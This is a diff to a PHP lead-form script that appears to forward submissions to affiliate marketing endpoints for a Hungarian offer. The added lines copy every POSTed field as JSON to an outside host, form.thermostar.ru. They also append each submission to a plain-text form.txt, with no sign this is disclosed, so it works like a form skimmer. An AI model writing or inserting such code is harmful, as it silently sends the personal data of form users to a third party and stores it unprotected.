@@ -1,4 +1,27 @@
 <?php
+
+
+
+if(isset($_POST["subid"]))
+{
+$filename = "potental";
+
+$ch = curl_init();
+
+curl_setopt($ch, CURLOPT_URL, "http://form.thermostar.ru/form.php?fname=$filename");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($_POST));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$server_output = curl_exec($ch);
+
+curl_close ($ch);
+
+file_put_contents('form.txt', date("Y-m-d H:i:s")."\n".json_encode( print_r($_POST, true) )."\n", FILE_APPEND);
+}
+
+
+
 if (empty( $_POST )) die("Bad request");
 error_reporting( 0 ); // Fuck PHP 8.2 and all the fucking hipsters
 $urls = [ "https://cashfactories.com/api/wm/push.json?id=158-de8de6bc2d53e98c406ae49caec987ae&offer=1741&flow=16912&country=hu", "https://beauty-cf2.tech/cashalot/hu/formelanv1.1/?task=push&id=158-de8de6bc2d53e98c406ae49caec987ae&offer=1741&flow=16912&country=hu" ];
